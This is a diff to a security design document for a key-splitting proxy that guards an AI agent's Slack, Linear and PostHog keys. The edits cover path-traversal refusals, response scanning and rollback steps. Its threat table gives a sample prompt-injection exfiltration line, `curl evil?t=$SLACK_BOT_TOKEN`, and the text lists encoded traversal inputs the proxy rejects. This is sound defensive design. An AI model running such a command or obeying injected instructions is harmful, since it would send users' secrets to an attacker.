@@ -47,7 +47,8 @@ note lists its nine gaps, and the SDK wire capture (Gate B) behind the decisions
 
 - The prefix table in `cli/key_patterns.py` gains `slack: [xoxb-, xoxp-]`, `linear: [lin_api_]`,
   `posthog: [phx_]`. A key is a tool key **only** because its prefix is in that table.
-- Each tool vendor's upstream URL lives **in code next to that table**, not in `providers.toml`. No TOML entry,
+- Each tool vendor's upstream URL lives **in code next to that table**, not in `providers.toml`: Slack's API
+  URL, Linear's GraphQL URL, and both `https://us.posthog.com` and `https://eu.posthog.com`. No TOML entry,
   bundled or user, can declare `passthrough`, and a user entry can't shadow a tool vendor's URL.
 - The new prefixes, and the refused secret prefixes in D7, join `KEY_PATTERN`, so `worthless scan`, the
   pre-commit hook, the code scanner, the OpenClaw audit and log redaction report them for every user, flag or
@@ -70,8 +71,9 @@ generic protocol can come later ([WOR-998](https://linear.app/plumbusai/issue/WO
 - A passthrough request is forwarded as sent: method, raw path (from the ASGI `raw_path`), query string and
   body bytes. Base URL and path are joined as plain strings, never with `urljoin`, so `//evil.com` after the
   alias stays on the vendor's host.
-- Refused with the uniform 401, before the rules run and before decrypt: `.` or `..` segments in any `%2e` case
-  mix, including after one round of percent-decoding (`..%2f..`), and any `\` or `%5c`. httpx collapses `..`,
+- Refused with the uniform 401, before the rules run and before decrypt: any `%25` (an encoded `%`, so the path
+  can't be decoded twice into something else), and `.` or `..` segments or any `\` in the path as received or
+  after percent-decoding it (`%2e%2e`, `..%2f..`, `%5c`). The bytes forwarded are the raw ones. httpx collapses `..`,
   which would let a path escape the base.
 - Decrypt and reconstruct go through one shared helper in `proxy/app.py`, so key reconstruction still has a
   single call site after the gate.
@@ -121,12 +123,15 @@ with a bigger blast radius. It stays that way until request budgets ship (F8a,
     into a body-less GET, and sync `slack_sdk` keeps the Bearer header across hosts);
   - `Set-Cookie` is stripped; `Cookie`, `Forwarded` and `X-Forwarded-*` are not forwarded upstream;
   - the proxy never retries: one inbound request, one upstream call;
-  - a buffered body over the cap (about 10 MiB, any status) becomes a 502; a streamed body that overflows after
-    headers are sent aborts the connection, never a truncated 200;
-  - if a buffered response contains the real key's exact bytes, the client gets a 502.
+  - the proxy reads the whole response (up to about 10 MiB, any status) before sending anything back, so a body
+    over the cap becomes a 502 and a client never sees a partial response. `text/event-stream` responses are
+    refused with a 502; no v1 vendor streams;
+  - if the response headers or body contain the real key, the client gets a 502.
 - This alias's shard-A anywhere else in the request (path, query, any other header, body) gets the uniform 401
-  before decrypt. A request with `Content-Encoding` is refused. The match is on this alias's shard-A bytes,
-  never a token pattern: PostHog sends the public `?token=phc_…` on every call.
+  before decrypt. The check runs on the raw bytes **and** on a decoded view (percent-decoded path, query and
+  form values; JSON-unescaped strings), so an encoded copy can't slip through; the forwarded bytes stay raw. A
+  request with `Content-Encoding` is refused. The match is on this alias's shard-A, never a token pattern:
+  PostHog sends the public `?token=phc_…` on every call.
 - The proxy's **own** refusals stay byte-identical to the uniform 401. Its own 429/502/503/504 carry an
   `x-worthless-` marker header, so they can't be mistaken for the vendor's; upstream copies of that header are
   stripped as today.
@@ -159,9 +164,10 @@ Scrubbing other secrets out of responses is F7 ([WOR-977](https://linear.app/plu
 
 **Why:** the SDKs take a base URL as a constructor argument; Gate B confirmed none reads one from the
 environment. So "no code changes" isn't true for tool keys; "one line per tool" replaces it. The vendor default
-in the snippet makes `unlock` a rollback with **no code change, but one agent restart**: unlock removes the
-variable and retires shard-A, and the running agent keeps the old values in its environment (every call 401s,
-and may raise a retired-key alarm) until it restarts.
+in the snippet makes `unlock` a rollback with **no code change**, in three steps: lift the outbound block on
+the vendor hosts (D9), run `unlock`, restart the agent. Unlock removes the variable and retires shard-A; the
+running agent keeps the old values in its environment (every call 401s, and may raise a retired-key alarm)
+until it restarts.
 
 ### D7. Experimental, behind `--tool-keys`
 
@@ -221,7 +227,7 @@ verification script passes **as the agent user**:
 - the agent runs under its own uid or container;
 - `~/.worthless` and the Fernet key are unreadable to it;
 - the Fernet key lives **off any disk a VM snapshot or backup captures** (a keychain, a separate volume or a
-  remote store), or Mappy accepts that a VM snapshot holds both halves;
+  remote store). If that isn't possible on Mappy, it doesn't go live: a VM snapshot would hold both halves;
 - the proxy listens on loopback only;
 - `worthless unlock` fails as the agent user;
 - outbound traffic from the agent's uid to the vendor API hosts is blocked and logged. This is **required**,
@@ -258,12 +264,12 @@ PostHog's SDK never raises, so nobody would notice.
 
 | Leak path | Protected? |
 |---|---|
-| `.env`, git history, CI log, transcript or screenshot leaves the box | **Yes.** It holds only shard-A, which the vendor rejects, as long as the proxy can't be reached from where the file lands (loopback only). |
+| `.env`, git history, CI log, transcript or screenshot leaves the box | **Yes.** It holds only shard-A, as long as the proxy can't be reached from where the file lands (loopback only). That each vendor rejects shard-A is expected but not yet tested live; the live leg confirms it before go-live. |
 | Prompt injection sends the agent's env off the box (`curl evil?t=$SLACK_BOT_TOKEN`) | **Yes, with F6.** Shard-A is useless off the box. Without F6 the same injection can copy `~/.worthless` and the Fernet key too. |
 | A backup of the agent user's home directory | **Yes, with F6**, because the key store is outside that home. |
 | A VM-level snapshot or disk backup | **No**, unless the Fernet key lives off that disk (D9). One snapshot otherwise holds both halves. |
 | Code running on the box *uses* the key through the proxy | **No.** Limited only by the rate limit until request budgets (F8). Per-operation policy is F7. |
-| A vendor response echoes a secret | A **buffered** response with the real key's exact bytes → 502; streamed responses aren't checked. Other secrets: **no**, until F7. |
+| A vendor response echoes a secret | The real key in a response header or body → 502 (responses are read whole). Other secrets: **no**, until F7. |
 
 ## Alternatives considered
 
@@ -298,8 +304,8 @@ raw-query rules matter for these SDKs.
 
 **Costs and accepted risks**
 
-- One code line per vendor, and only for clients we configure (D6). Rollback is no code change but one agent
-  restart.
+- One code line per vendor, and only for clients we configure (D6). Rollback is no code change, but three
+  ordered steps: lift the outbound block, `unlock`, restart the agent.
 - Someone on the box holding the active shard-A is limited only by the per-alias rate limit until F8a.
 - The proxy becomes a single point of failure for the agent's tools: `worthless service install` with a restart
   policy and health check, plus an outage drill, are part of the rollout. Passthrough gets its own HTTP client so
